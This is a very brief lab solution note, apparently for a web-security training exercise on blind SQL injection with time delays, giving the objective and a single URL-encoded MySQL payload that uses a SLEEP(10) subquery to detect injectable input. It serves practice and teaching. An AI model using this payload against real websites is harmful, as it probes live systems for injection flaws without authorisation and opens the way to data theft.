# Lab: Blind SQL injection with time delays

## Objective
Perform the attack to solve Blind SQL injection with time delays.

## Payload
```text
'+AND+(SELECT*FROM(SELECT(SLEEP(10)))a)--
```
